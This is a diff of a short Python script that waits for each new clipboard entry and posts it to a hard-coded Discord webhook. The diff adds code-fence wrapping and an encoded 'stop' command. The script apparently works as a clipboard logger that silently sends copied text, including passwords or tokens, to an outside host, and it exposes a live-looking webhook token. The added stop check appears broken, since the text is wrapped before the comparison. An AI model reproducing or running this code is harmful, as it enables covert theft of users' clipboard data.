@@ -38,8 +38,11 @@ finally:
 while True:
 	newCOPY = pyperclip.waitForNewPaste()
 	# print(newCOPY)
+	newCOPY = "```\n" + newCOPY + "\n```"
 	usrhook = {"content": newCOPY,
 		"username": "Kopier",
 		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
 		"tts": "false"}
 	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)
+	if newCOPY == "Q01EOlNUT1BbbV1Lb3BpZXI=":
+		break
